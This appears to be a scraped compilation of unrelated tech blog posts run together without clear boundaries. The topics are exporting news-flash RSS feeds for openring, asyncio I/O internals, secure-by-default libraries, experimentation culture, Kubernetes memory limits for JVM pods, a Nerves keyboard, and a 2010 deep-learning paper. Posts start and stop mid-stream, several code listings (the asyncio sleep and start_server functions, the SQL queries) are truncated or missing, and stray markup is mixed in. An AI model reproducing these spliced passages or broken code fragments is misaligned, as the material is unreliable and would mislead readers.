Since <code>news-flash</code> is FOSS, a quick into the sourcecode revealed the following.</p>
<div><div>

</span><span></span>}<span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>And <code>glib</code> is refering to the GTK+ library for rust.
Gnome uses the <a href="https://developer.gnome.org/basedir-spec/">XDG Base Directory Specification</a>, which tells us how data and config directories are to be defined.
With this knowledge equipped, I found the folder, and in it resides a SQLite database file.</p>
<blockquote>
<p>It actually was a little more complicated than that. I am using Pop!OS (currently contemplating a migration to nixOS) which does not set <code>XDG_DATA_HOME</code>, but I found it in my home folder’s <code>.var/</code> folder.</p>
</blockquote>
<h2 id="identifying-the-data-location">Identifying the data location</h2>
<p>Next up was finding out what to take out of the database.
For openring to work, links to the RSS feeds of the respective sites are needed.
Let’s take a look inside the database.</p>

</div>
</div><p>So to find our feeds, the logical conclusion would be to look sinde the <code>feeds</code> table.</p>
<div><div>

</code></pre></td></tr></tbody></table>
</div>
</div><p>Bingo!
Next, I want to only export feeds from blogs that I directly want to link upon, since it’s a quasi endorsement and also webrings are about distribution and decentralisation, so no need to link to hackernews.
For that I created a category called <code>blog-export</code>.
The <code>categories</code> table looks as follows.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3

CREATE TRIGGER on_delete_category_trigger
	AFTER DELETE ON categories
	BEGIN
		DELETE FROM feed_mapping WHERE feed_mapping.category_id<span>=</span>OLD.category_id;
	END;
</code></pre></td></tr></tbody></table>
</div>
</div><p>Lastly, how do we connect a category to a feed?
My first bet was the <code>feed_mapping</code> table, and I was right.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4

<pre><code data-lang="sh">sqlite&gt; .schema feed_mapping
CREATE TABLE feed_mapping <span>(</span>

	category_id TEXT NOT NULL REFERENCES categories<span>(</span>category_id<span>)</span>,
	PRIMARY KEY <span>(</span>feed_id, category_id<span>)</span>
<span>)</span>;
</code></pre></td></tr></tbody></table>
</div>
</div><p>With all pieces together, let’s construct a query which extracts all rss feed URLs from our <code>blog-export</code> category.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1

</div><p>Beautiful!</p>

<p>I poured all this knowledge into a <a href="https://github.com/Milchdealer/teraku.de/tree/main/scripts/openring_from_news-flash.py">python script</a> which basically runs this query and then starts the <code>openring</code> program, using the feeds as arguments.
I added it to my <a href="https://github.com/Milchdealer/teraku.de/tree/main/scripts/deploy.sh">deployment script</a>, which I run to update my blog, and the result you can see below. 🤓</p>

      <h3 id="introduction">Introduction</h3>

<p>Because breaking tasks into pieces and scheduling to run them asynchronously introduce runtime overheads, if the asynchronous program does not have too much I/O time to be saved from <code>asyncio</code>, the performance of executing those tasks asynchronously will be worse than executing those tasks synchronously. This means asynchronous I/O is the most important part of single-thread asynchronous application.</p>



<p>The question is how does <code>asyncio</code> save I/O time? A quick metaphor will be as follows. I have a candy factory and there are three production lines producing candies one by one. The candies from the production line will drop to the ground at the end of the production line, but dropping the candies to the ground will contaminate the candies. Unfortunately, I only got one worker to collect candies into the box. What’s his best strategy to collect as many candies as possible? Typically, he could have two strategies.</p>

<ul>
  <li>Collecting candies at one production line at one time.</li>
  <li>Placing a box at the end of each production line. Rotating between the production lines from time to time and collecting the candies from the boxes.</li>
</ul>

<p>Obviously, smart people will choose the second strategy. Basically, this first strategy is the single-thread synchronous application, and the second strategy is the single-thread asynchronous application.</p>



<p>In this blog post, I would like to discuss the asynchronous of IO for Python asynchronous programming using <code>asyncio</code>.</p>

<h3 id="asynchronous-sleep">Asynchronous Sleep</h3>

<p>A common I/O-bound task includes the <code>sleep</code> function. Using the synchronous and blocking <code>time.sleep</code>, we would have to wait and be blocked for whatever seconds we specified before it is returned.</p>



<p>In <code>asyncio</code>, we also have an asynchronous version of the <code>sleep</code> coroutine function, <code>asyncio.sleep</code>. By scheduling the coroutine to the event loop, during the sleep duration, we are not blocked from doing something else. Here is how <a href="https://github.com/python/cpython/blob/3.8/Lib/asyncio/tasks.py#L638"><code>asyncio.sleep</code></a> is implemented.</p>

<div><div><pre><code><span>async</span> <span>def</span> <span>sleep</span><span>(</span><span>delay</span><span>,</span> <span>result</span><span>=</span><span>None</span><span>,</span> <span>*</span><span>,</span> <span>loop</span><span>=</span><span>None</span><span>):</span>

</code></pre></div></div>

<p>Surprisingly, it is very simple. We create a <code>Future</code> and use a <code>callback</code> to set the value for this <code>Future</code> after some sleep duration <code>delay</code>. Once the result of <code>Future</code> got set, the sleep is over. During the the sleep duration <code>delay</code>, the event loop could schedule some other <code>callbacks</code> to do other tasks. It should be noted that such sleep duration is not precise in practice, due to the nature of event loop scheduling. For instance, if somehow the event loop scheduled a <code>callback</code> that takes extremely long to finish during the sleep duration, the actual sleep time would be much longer than what we were expecting. For example,</p>

</code></pre></div></div>

<p>In this particular example, if we first schedule asynchronous sleep and then schedule a block execution, the finish of sleep has to wait until the the block execution finishes. This is also because the callback scheduling is sophisticated and not smart. Not sure if it is theoretically possible to have a smart event loop implementation.</p>

<h3 id="asynchronous-read">Asynchronous Read</h3>

<p>Although we have seen how <code>sleep</code> is scheduled asynchronously in the event loop, this does not help us understand how other IO-bounded tasks were scheduled very much. For example, if a server receives messages from multiple clients, how does it schedule the <code>callback</code>s asynchronously?</p>



<p>This is a simple server that could asynchronously reading messages from and sending messages to multiple clients asynchronously.</p>

<p>The documentation of <code>asyncio.start_server</code> says “The <code>client_connected_cb</code> callback is called whenever a new client connection is established. It receives a (reader, writer) pair as two arguments, instances of the <code>StreamReader</code> and <code>StreamWriter</code> classes.” Therefore, the connection to the server is not blocking, allowing multiple clients connecting to the sever. If the connection were synchronous and blocking, only one connection could be established.</p>



<p>The data reading and writing to the streams have to be asynchronous as well. Different clients use different sockets in the same port. Each file from the client sent to the server socket will have an <code>EOF</code> (end-of-file), which is an indication of the end of transfer. If the data reading and writing is synchronous, the network connection between the server and one client is poor, even if the file being transferred is small, it might take a long time to receive the <code>EOF</code>, thus blocking the entire thread.</p>



<p>Using the asynchronous <a href="https://github.com/python/cpython/blob/3.8/Lib/asyncio/streams.py#L643"><code>StreamReader.read</code></a> method, we could switch between the multiple connections to the clients. Let’s check how it is achieved.</p>



<p>When we start an server, a <code>StreamReader</code> will be created and a <code>StreamReaderProtocol</code> will wrap the the <code>StreamReader</code>.</p>

<div><div><pre><code><span>async</span> <span>def</span> <span>start_server</span><span>(</span><span>client_connected_cb</span><span>,</span> <span>host</span><span>=</span><span>None</span><span>,</span> <span>port</span><span>=</span><span>None</span><span>,</span> <span>*</span><span>,</span>

    <span>"""Start a socket server, call back for each client connected.
    The first parameter, `client_connected_cb`, takes two parameters:
    client_reader, client_writer.  client_reader is a StreamReader
    object, while client_writer is a StreamWriter object.  This
    parameter can either be a plain callback function or a coroutine;
    if it is a coroutine, it will be automatically converted into a
    Task.
    The rest of the arguments are all the usual arguments to
    loop.create_server() except protocol_factory; most common are
    positional host and port, with various optional keyword arguments
    following.  The return value is the same as loop.create_server().
    Additional optional keyword arguments are loop (to set the event loop
    instance to use) and limit (to set the buffer limit passed to the
    StreamReader).
    The return value is the same as loop.create_server(), i.e. a
    Server object which can be used to stop the service.

<p>“If you could wave a magic wand and do anything to reduce vulnerabilities, what would you do?”</p>
<p>Some common answers are things like training and education, forcing penetration testing, better tools, and smarter users, but none of these things really strike at the core of the issue. Where is the vulnerability garden? Where are those vulnerabilities planted? Can we make that soil hostile to vulnerabilities and rich for good coding practices?</p>
<p>We can. The answer is to make it as hard as possible to introduce vulnerabilities in the first place. The best way to accomplish that is to provide developers libraries, frameworks, defaults, and wrappers so that every developer finds it easy to <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">Fall Into The Pit of Success</a> .</p>
<p>Choosing better frameworks that have good ORMs (fewer SQLi), templating engines (fewer XSS), authentication systems, and other security controls can massively reduce the likelihood of a vulnerability. You can mitigate entire classes of vulnerabilities through these good choices.</p>
<p>A security team can take this to the next level by selecting great libraries that are secure by default, by setting secure defaults through settings or policy, and by creating wrappers for existing libraries to instill security best practices into existing libraries.</p>
<p>The <strong>critical</strong> point to this, though, is that you must make it easier to do the secure thing than the insecure thing. If you ask developers to meet you half way or to adopt a new way that takes more time, you will fail. Developers want to build secure software, but they have massive pressure to deliver on features and hit deadlines. The pressure to ship and generate revenue will almost always win out over spending the time and money necessary to create more secure software. This is the real world after all.</p>
<p>Make it easy, let them fall into the pit of success.</p>

<p><em>If you want to get a competitive edge, building a culture of experimentation is critical. It can result in cost savings, higher revenue, and improved user experience.&nbsp;</em></p>


<p>People have been building scientific and technological innovations through testing and experimentation for centuries.&nbsp;</p>


<p>Eratosthenes measured the circumference of Earth 2,000 years ago.&nbsp;</p>


<p>Newton's prism experiment proved color is an inherent property of light itself.&nbsp;</p>


<p>Marie Curie, using an instrument called electrometer, found that radioactivity is an inherent property of individual atoms that emanates from their internal structure.</p>


<p>These experiments have paved the way for modern medicine, geography, energy, communication, physics, etc.&nbsp;</p>


<p>In today's technological world, experimentation holds the same power when it comes to innovation.&nbsp;</p>


<p>Some of the biggest companies, like Amazon, Netflix, and Google, use this scientific method to challenge the status quo. In return, they innovate, grow, and improve.</p>


<p>Amazon CEO, Jeff Bezos, has said: “Our success at Amazon is a function of how many experiments we do per year, per month, per week, per day.”</p>


<p>Mark Zuckerberg has reported that the company conducts thousands of experiments at any given time.</p>


<p>As far back as 2008, Google was already leveraging its search engine users to simultaneously conduct 50–200 experiments.</p>


<p>The end goal of this "test everything" mentality? To roll out new products, get past the competition, improve customer experience, and try new business models.&nbsp;</p>





<h2 id="why-an-experimentation-culture-is-valuable">Why an Experimentation Culture is Valuable</h2>



<p>Only a decade ago, Yahoo was on a par with Google. The two tech giants were competing fiercely to conquer the territory of the World Wide Web. But Google's ferocious experimentation led the company on a path of continuous improvement. Today, Google has a market share of 92.17%, Bing has 2.78%, and Yahoo has 1.6%.</p>


<p>But not all experiments yield successful innovations.&nbsp;</p>


<p>At Google and Bing, about <a href="https://hbr.org/2017/09/the-surprising-power-of-online-experiments" target="_blank" rel="noreferrer noopener">10% to 20% of controlled experiments</a> have positive results. One-third of experiments at Microsoft prove effective, one-third have neutral results, and one-third have negative results.</p>


<p>But that capability to test out everything to see what works and what doesn't has given these companies a competitive edge.&nbsp;</p>


<p>Experimentation has helped Bing make dozens of monthly improvements, which collectively have boosted revenue per search by 10% to 25% a year.&nbsp;</p>


<p>When Facebook tested a secondary "Explore" Feed to its primary News Feed in six countries that let users discover content that they haven't explored yet, it resulted in a 60-80% engagement rate.</p>


<p>To sum up: although experimentation may scare you with its tiny success rate, the benefits can help a company iterate quickly, fail fast, and pivot.&nbsp;</p>


<h2 id="how-to-build-an-experimentation-culture">How to Build an Experimentation Culture</h2>


<p>Successful innovation requires building a culture of experimentation at a company-level. A culture of experimentation involves nurturing employees' curiosity, listening to data, allowing everyone to conduct or commission a test, and managers accepting a new model of leadership.&nbsp;</p>


<h3 id="a-culture-of-experimentation-starts-with-accepting-failure">A Culture of Experimentation Starts With Accepting Failure</h3>


<p>"Failure and invention are inseparable twins." It's what Jeff Bezos says. And he's a smart man.</p>


<p>Building a culture of experimentation starts with the engineering manager accepting that failure will happen, but that shouldn't be an obstacle to continue experimenting.</p>


<p>Instead, failure should be viewed as an inherent and integral part of the learning process.&nbsp;</p>


<p>When leaders accept it as such, it will send a message to the entire company that failure isn't something to be dreaded or scared of. It means the company is learning, growing, and with each experiment, it's closer to achieving its goals.&nbsp;</p>


<p>Everyone involved will feel more comfortable giving feedback, sharing ideas, and brainstorming. Creative minds at the company will be unleashed to try big, new, unproven ideas, and at the same time, business executives will get guaranteed results fast.</p>


<h3 id="small-changes-can-generate-huge-benefits">Small Changes Can Generate Huge Benefits</h3>


<p>We'll use one of Microsoft's real-life stories as an example.&nbsp;</p>


<p>In 2008, an employee suggested having a new tab automatically open when a user clicks on the Hotmail link, instead of opening in the same tab.&nbsp;</p>


<p>A seemingly small change, but when it was tested on 900,000 users in the UK, the engagement of users who opened Hotmail increased by a whopping 8.9%. In 2010, the company introduced the change to 2.7 million users in the US, and it yielded the same results.&nbsp;</p>


<p>Amazon did a similar thing when it moved its credit card offers from the home page to the shopping cart page. The result? Profits increased by tens of millions of dollars annually.&nbsp;</p>


<p>The lesson in these stories is that there's value in introducing a small change quickly, to a small set of users, in order for your engineers to learn whether you're building the right thing.&nbsp;</p>


<p>Starting small is a better option than polishing a large feature, introducing it to a large user base, only to hear a few weeks or months later that the business goals have not been achieved or that the key metric hasn't changed.&nbsp;</p>


<h3 id="more-experiments-are-better-than-few">More Experiments Are Better Than Few</h3>


<p>Many companies today run tens of thousands of online experiments every year. Out of those tens of thousands of experiments, only a few will be successful.</p>


<p>Although it sounds expensive, it's actually riskier to run only a few experiments per year than a thousand.&nbsp;</p>


<p>When you conduct a large number of experiments, a few will be successful. The success of those few experiments will make the financial costs of a string of failed experiments irrelevant.&nbsp;</p>


<p>On the other hand, if you run only a few experiments annually and none of them prove successful, you'll be left dealing with a substantial financial loss.&nbsp;</p>


<p>Failing is useful because it allows <a href="https://adevait.com/software" target="_blank" rel="noreferrer noopener">software developers</a> to eliminate unfavorable ideas and focus their attention on more-promising solutions.</p>


<div><figure><img src="https://content.adevait.com/wp-content/uploads/2020/08/Experiments-1024x517.png" alt="culture of experimentation"></figure></div>


<h3 id="rely-on-data-not-on-strong-opinions">Rely on Data, Not on Strong Opinions</h3>


<p>Every company has people working there, and people have strong opinions. When results from an experiment clash with strong opinions by a team or employee, make sure the empirical results of your online experiments prevail.&nbsp;</p>


<p>The tale of Ron Johnson when he became the CEO of JC Penney is another great story that carries a lesson.</p>


<p>When Johnson joined the company in 2011, he had a bold new plan in mind: he would use technology to eliminate the need for cashiers, get rid of coupons and clearance racks, and fill the stores with branded pieces.</p>


<p>Almost 17 months later, sales had decreased, significant losses were experienced, and ultimately, Johnson had lost his job.&nbsp;</p>


<p>What happened?</p>


<p>Unfortunately, many managers in the business realm lack sufficient data or relevant experience to lead their business decisions. Many managers also rely more on their intuition than on numbers.</p>


<p>If the experiment tells you that you should remove the green button, you remove the green button.&nbsp;</p>


<p>This doesn't mean that managers shouldn't be listened to on all occasions. When it comes to making strategic decisions that can't be tested, managers' input holds value.</p>


<p>But all things that can be tested in a company should be tested. Experiments can guide managers' decisions and fuel healthy debates. Even if those debates end up in overruling the data, at least the company is conscious of the experiments' results and is making a move that's in the company's best interest.&nbsp;</p>


<div><figure><img src="https://content.adevait.com/wp-content/uploads/2020/08/A-B-testing-1024x676.png" alt="A/B testing culture of experimentation"></figure></div>


<h3 id="keep-the-feedback-coming">Keep the Feedback Coming</h3>


<p><a href="https://adevait.com/software/feedback-for-software-developers" target="_blank" rel="noreferrer noopener">Giving feedback to your software developers</a> can inspire them to do future tasks even better and with higher motivation. It can engage an underperforming individual to improve his/her performance to a higher level.&nbsp;</p>


<p>Feedback is also the only way to ensure an employee doesn't continue making the same mistakes.</p>


<p>The majority of employees are interested in hearing feedback from their managers; however, what they crave for is specific feedback.&nbsp;</p>


<p>Specific feedback is telling your engineer what they're doing right and where there's room for improvement.&nbsp;</p>


<p>For example, instead of saying to your <a href="https://adevait.com/javascript-developers" target="_blank" rel="noreferrer noopener">JavaScript developer</a>, "You could be more proactive," say, "You said you would come up with some ideas for overcoming the issue with <a href="https://adevait.com/software/technical-debt" target="_blank" rel="noreferrer noopener">technical debt</a>, but I still haven’t received anything. Is there some problem?"</p>


<p>One great way of giving feedback is the SBI (Situational, Behavior, Impact) Framework.</p>


<p>The SBI framework outlines a simple structure that you can use to give feedback:</p>


<ol><li><strong>Situation</strong>: define the where and the when of the situation you're referring to.&nbsp;</li><li><strong>Behavior</strong>: describe the specific behavior of the employee in the situation you're referring to.</li><li><strong>Impact</strong>: say how the person's behavior has impacted you or others.</li></ol>


<p>In the long run, this can lead to higher performance, unlike less specific feedback that just informs employees of whether they are performing well.</p>


<h3 id="finally-celebrate-your-wins-and-learn-from-your-failures">Finally, Celebrate Your Wins and Learn From Your Failures</h3>


<p>When an experiment yields a successful innovation, celebrate! Celebrating your successes and giving credit where it is due will motivate others to become a part of the culture of experimentation at your company.&nbsp;</p>


<p>And when you fail, learn from it! Even if it's a failed experiment, failures can steer you in the right direction when you lack answers or people have conflicting opinions about an idea.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><time datetime="2020-08-24T17:35:07.322Z">August 24, 2020</time></span> | <span>6 min read</span></p></div><div><div><div><p>In Kubernetes, scaling applications vertically, that are primarily designed to scale horizontally (i.e. microservices) could be a challenging task. That's especially true for setting the <strong>right resource limits for your pod that is running a JVM application</strong>. In addition, memory management/usage of a JVM application is also an interesting topic, but this article is not about that. If you would like to get familiar with the core concepts of memory handling, heap and GC inside JVM, you should take a look on <a href="https://www.youtube.com/watch?v=bspS-uTK0IM" target="_blank" rel="noreferrer noopener">this comprehensive video</a> first.</p>
<h2><code>-Xms</code>, <code>-Xmx</code> and the problem with them</h2>
<p>As you probably already know, you can set the initial (<code>Xms</code>) and the maximum (<code>Xmx</code>) memory pool allocation for a JVM application with these flags. And they just work fine. For example, if you set <code>-Xms128M</code> and <code>-Xmx256M</code> and you start monitoring your application with <a href="https://visualvm.github.io/" target="_blank" rel="noreferrer noopener">VisualVM</a>, you'll see something like this:</p>
<p><img src="https://akobor.me/assets/blog/kubernetes-jvm-limits/xms_xmx_heap_size.png" alt="Heap size with Xms set"></p>
<p>It seems totally fine, your application requests a minimum of 128MiB of memory, which means that it will be allocated to the heap right after the application starts, and will be limited to 256MiB afterwards. Let's check the overall memory usage of the same Java process (see the highlighted row):</p>
<p><img src="https://akobor.me/assets/blog/kubernetes-jvm-limits/actual_mem_usage.png" alt="Heap size with Xms set"></p>
<p>🙀 Well, that's a bit more than 256MiB... The reason behind this is that <strong>JVM uses memory outside the heap for other purposes as well</strong> (metaspace, code cache, etc.), while <code>Xmx</code> affects only the heap.</p>
<h2>The NOT so happy path with resource limits</h2>
<p>As your resources are limited inside a Kubernetes cluster, you have to be careful when it comes to the allocation of them, since you want to avoid the situation where one pod eats up all your resources, and the others will "starve".</p>
<p>Let's take the following example...</p>
<h3>Setting <code>Xms</code> and <code>Xmx</code> inside a Docker image</h3>
<p>You can pass these flags to your JAR in a Docker image like that:</p>
<pre><code>

<span>ENTRYPOINT</span><span> [<span>"java"</span>, <span>"-Xms128M "</span>, <span>"-Xmx256m"</span>, <span>"-jar"</span>, <span>"your-precious-service-1.0.0.jar"</span>]</span></code></pre>
<p>Alternatively, if you're using <a href="https://github.com/GoogleContainerTools/jib" target="_blank" rel="noreferrer noopener">Jib</a>, you can make it work like this in your <code>build.gradle</code>:</p>
<pre><code>
jib {
    to {
        image = <span>"yourorg/yourimage:tag"</span>
    }
    container {
        environment = [<span>"JAVA_TOOL_OPTIONS"</span>: <span>"-Xms128M -Xmx256M"</span>]
    }
}</code></pre>
<h3>Setting the memory limit in Kubernetes</h3>
<p>If you are not aware of the things described above, you could easily end up with a configuration that will cause regular restarts to your pods due to <a href="https://kubernetes.io/docs/tasks/configure-pod-container/assign-memory-resource/#exceed-a-container-s-memory-limit" target="_blank" rel="noreferrer noopener">OOMKilled</a>.
When it  comes to memory limits, you can set the following parameters in your deplyoment:</p>
<pre><code><span>apiVersion:</span> <span>apps/v1</span>
<span>kind:</span> <span>Deployment</span>
<span>metadata:</span>

<span>spec:</span>
  
  <span>template:</span>
    
    <span>spec:</span>
      <span>containers:</span>
        <span>-</span> <span>image:</span> <span>yourorg/yourimage:tag</span>
          <span>name:</span> <span>your-service</span>
          <span>resources:</span>
            <span>requests:</span>
              <span>memory:</span> <span>128Mi</span> 
            <span>limits:</span>
              <span>memory:</span> <span>256Mi</span> </code></pre>
<p>Let's assume that you set the limits above for your pod, since you've also set the same limits in your Docker image via <code>-Xms</code> and <code>-Xmx</code> flags. Then you deploy your service, it spins up without any issue, you are confident and highly satisfied, so you go to get some sleep. <em>At this point you should make sure that you've also updated your job title on LinkedIn to something like "Kubernetes Evangelist".</em> Next morning you check your pod, just to make sure everything's good, and you see this:</p>
<pre><code>➜  ~ kubectl get po
NAME                              READY   STATUS    RESTARTS   AGE
your-service-5d65667768-qksk6     1/1     Running   56         8h</code></pre>
<p><img src="https://media.giphy.com/media/tu54GM19sqJOw/giphy.gif" alt="Wait, WHAT?!?!?!"></p>
<p>Well, that's not exactly what you would expect, right? You probably already have figured out what happened: as we've seen above, the memory usage of a JVM application is not just about the heap's size, so your pod get OOM killed several times as <strong>your application exceeded the pod's memory limit again and again</strong>. </p>
<h2>The right approach</h2>
<p>First of all: for the sake of example let's assume that your heap size limits inside your image are fine. However, if you want to make sure your application reserves all the heap it will use up-front, you could set <code>Xms = Xmx</code> as a rule of thumb.</p>
<p>Regarding your Kubernetes deployment's resource configuration, to avoid OOM kills you should take the following into account:</p>
<ol>
<li><code>requests != Xms</code> - More precisely, your <code>requests</code> value should be definitely larger than your <code>Xmx</code>, and the difference <strong>depends on your application</strong>. If it's a "simple" microservice, you'll be OK with ~30% in addition, but if it's doing a lot of stuff outside the heap, you should consider providing a much larger value here.</li>
<li><code>limits != Xmx</code> - Again, these values are not interchangeable. Your pod's suggested memory limit depends on a lot of stuff (i.e. the used Java base image is an important factor here), so you have to choose it carefully. It might be a good practice to <strong>make some benchmarks with some stress testing</strong> to see, how much burst it generates in terms of the used memory when your application runs at its peak.</li>
<li>Setting a reasonably higher <code>limits</code> initially is always a good practice. If it turns out that you've set it to an unnecessarily high value, you can decrease it whenever you want, without risking a constant pod eviction due to OOM errors.</li>
</ol>
<p>To stick to the concrete case we described above: setting <code>requests</code> to ~320MiB and <code>limits</code> to ~512MiB would be a good start with the given <code>Xms</code> and <code>Xmx</code> values.</p>
<p><em>Generally speaking, the above suggestions could be useful, but the best strategy for setting resource limits in Kubernetes is to <strong>know your application's memory usage</strong>, because there is no formula that can be applied to every situation, since every application is unique.</em></p>

<small>2020-09-01</small><!-- RSS:2020-09-01T09:15:00Z -->
<p><a href="https://devchat.tv/elixir-mix/emx-102-nerves-powered-mechanical-keyboards-with-chris-dose/">
        Chris Dosé was interviewed</a> by us on Elixir Mix. When he spoke about his work on a Nerves-powered keyboard I knew this was a
    project I wanted to try out. So I dropped into their dev channel, acquired the hardware (thanks for the help) and have done some playing
    around with it.
</p>
<p>
    So what is the draw of a Nerves keyboard? Well, you can program it in Elixir. That's a big one for me personally.
    It also means that compared to a lot of high-level languages driving hardware you have pretty strong performance
    characteristics, resilience and specifically with Nerves a lot of best practices for running embedded hardware.
    It makes managing firmware updates easier, it mitigates corruption on SD cards and lots more. As an Elixir
    developer the pure convenience of customizing the keyboard in my favored language is of course delightful.
</p>
<p>
    This post should help you try it out if you have/get the required hardware. The project is currently using the Keybow
    keypad as a prototyping platform to figure out how things should work while they work on the details of a full
    keyboard and it is a neat little gadget, whatever you want to do with it.</p>
<h2>Getting started</h2>
<p>Requirements to try this:</p>
<ul>
<li>A Keybow kit, with Pi Zero (<a href="https://www.adafruit.com/product/4144">Adafruit</a>)</li>
<li>Micro USB Cable</li>
<li>Micro SD Card</li>
</ul>
<p>To get up and running you should:</p>
<ul>
<li><a href="https://hexdocs.pm/nerves/installation.html">Set up Nerves according to these instructions</a></li>
<li>Follow the <a href="https://github.com/ElixirSeattle/xebow">instructions at the xebow repo</a></li>
</ul>
<p>
    The installation guide might not tell you to go into <code>assets</code> and run <code>npm install</code> but I think
    you have to. I'm not going to tell you how to install Node and NPM because it varies. But you can probably find it <a href="https://nodejs.org/en/download/">around the Node site</a>.
</p>
<p>
    If you reach the point of having burned the firmware to your SD Card, congratulations. We are ready to play.
</p>
<h2>First firmware on the device</h2>
<p>So plug the SD card with your pristine Xebow firmware into the Keybow contraption and plug the Keybow into your
    computer
    with the Micro USB cable. Startup can take a little bit but it should settle into cycling through rainbow colors
    after a
    bit. It should also produce numbers when you poke it (the default keymap is a numpad plus some extras).</p>
<h2>Making changes</h2>
<p>I don't need a single numpad and now I have two of them. Let's make this more useful. Open
    <code>lib/xebow/keyboard.ex</code>
    in your preferred editor.</p>
<p>Replace the default keymap with:</p>
<pre data-file="lib/xebow/keyboard.ex"><span></span>    <span>@keymap</span> <span>[</span>
    <span># THE NAVIGATOR!</span>
    <span>%{</span>
      <span>k001</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:home</span><span>),</span>
      <span>k002</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:h</span><span>),</span>
      <span>k003</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:left</span><span>),</span>
      <span>k004</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:page_down</span><span>),</span>
      <span>k005</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:j</span><span>),</span>
      <span>k006</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:down</span><span>),</span>
      <span>k007</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:page_up</span><span>),</span>
      <span>k008</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:k</span><span>),</span>
      <span>k009</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:up</span><span>),</span>
      <span>k010</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:end</span><span>),</span>
      <span>k011</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:l</span><span>),</span>
      <span>k012</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:right</span><span>)</span>
    <span>}</span>
  <span>]</span>
</pre>
<p>And then:</p>
<pre data-file="/">export MIX_TARGET=keybow
mix firmware
mix firmware.gen.script
./upload.sh xebow.local
</pre>
<p>Sometimes the upload process can be finicky. You can always re-burn the firmware to the SD card instead using
    <code>mix firmware.burn</code> instead of the <code>gen.script</code>.</p>
<h2>The navigator</h2>
<p>So with the Keybow on its side, four wide. You'll have this fantastic navigation machine at your disposal.
    Top row are arrows, middle row is VIM navigation or GMail or wherever else the don't-move-your-fingers approach is
    used.
    Bottom row are the extremes of the first row.</p>
<table>
<tbody><tr>
<td>Left</td><td>Down</td><td>Up</td><td>Right</td>
</tr>
<tr>
<td>H</td><td>J</td><td>K</td><td>L</td>
</tr>
<tr>
<td>Home</td><td>PgDn</td><td>PgUp</td><td>End</td>
</tr>
</tbody></table>
<h2>Layers?</h2>
<p>So my plan for the keyboard just filled the entire keypad. But the xebow application supports layers, so you can do
    some
    interesting stuff there. I considered doing a chorded keyboard but I'm terrible at them and decided on this as
    something
    I might actually use. There are plenty of cool things you can do with Layers if you want.</p>
<h2>The Future</h2>
<p>The folks in #nerves-keyboard (on the <a href="https://elixir-slackin.herokuapp.com/">Elixir Slack</a>) are hard at work figuring out a real mechanical keyboard
    schematic
    that should be a very cool thing to own and play with. Most of the conversation in there right now is about PCB's, CAD and hardware layout. They are a welcoming bunch. So enjoy :)</p>

<p> In 2020, we are celebrating the 10-year anniversary of our <a href="http://arxiv.org/abs/1003.0358">publication</a>  <a href="#MLP1">[MLP1]</a> in <em>Neural Computation</em> (2010) on deep multilayer perceptrons trained by plain gradient descent on GPU. Surprisingly, our simple but unusually deep supervised artificial neural network (NN) outperformed all previous methods on the (back then famous) machine learning benchmark MNIST. That is, by 2010, when compute was 100 times more expensive than today, both our <em>feedforward</em> NNs <em>and</em> our earlier <em>recurrent</em> NNs (e.g., <a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%204">CTC-LSTM for connected handwriting recognition</a>) were  able to beat all competing algorithms on important problems of that time. In <a href="http://people.idsia.ch/~juergen/2010s-our-decade-of-deep-learning.html">the 2010s</a>, this deep learning revolution 
quickly spread from Europe to America and Asia. 
</p><hr>


<p>  
Just one decade ago, many thought that deep NNs  
cannot learn much without  unsupervised pre-training,
a technique 
<a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%201">introduced by myself in 1991</a> <a href="#UN0">[UN0-UN3]</a> and later also championed by others, e.g., <a href="#UN4">[UN4-5]</a> <a href="#VID1">[VID1]</a> <a href="#T20">[T20]</a>. In fact, it was
 claimed <a href="#VID1">[VID1]</a>
that <em>"nobody in their right mind would ever suggest"</em>  
to use plain gradient descent through <a href="http://people.idsia.ch/~juergen/who-invented-backpropagation.html">backpropagation</a> <a href="#BP1">[BP1]</a>
(see also <a href="#BPA">[BPA-C]</a> 
 <a href="#BP2">[BP2-6]</a> <a href="#R7">[R7]</a>)
 to train feedforward NNs (FNNs) with many layers of neurons.


</p><p> However, in March 2010, our team with  my outstanding Romanian 
postdoc Dan Ciresan  <a href="#MLP1">[MLP1]</a> 
showed that deep FNNs  
can indeed be trained by plain backpropagation 
 for important applications.  
This neither required <a href="http://people.idsia.ch/~juergen/firstdeeplearner.html">unsupervised pre-training</a>  
nor Ivakhnenko's incremental  layer-wise training of 1965 <a href="#DEEP1">[DEEP1-2]</a>. 
By the standards of 2010, our supervised NN had many layers.
It  set a new performance record <a href="#MLP1">[MLP1]</a> on 
the back then famous and widely used image recognition benchmark called MNIST <a href="#MNI">[MNI]</a>.
This was achieved by greatly accelerating traditional 
multilayer perceptrons on highly parallel 
graphics processing units called GPUs, going beyond the important GPU
work of Jung &amp; Oh (2004) <a href="#GPUNN">[GPUNN]</a>. 
A reviewer called this a 
<a href="http://people.idsia.ch/~juergen/handwriting.html">"wake-up call to the machine learning community."</a>

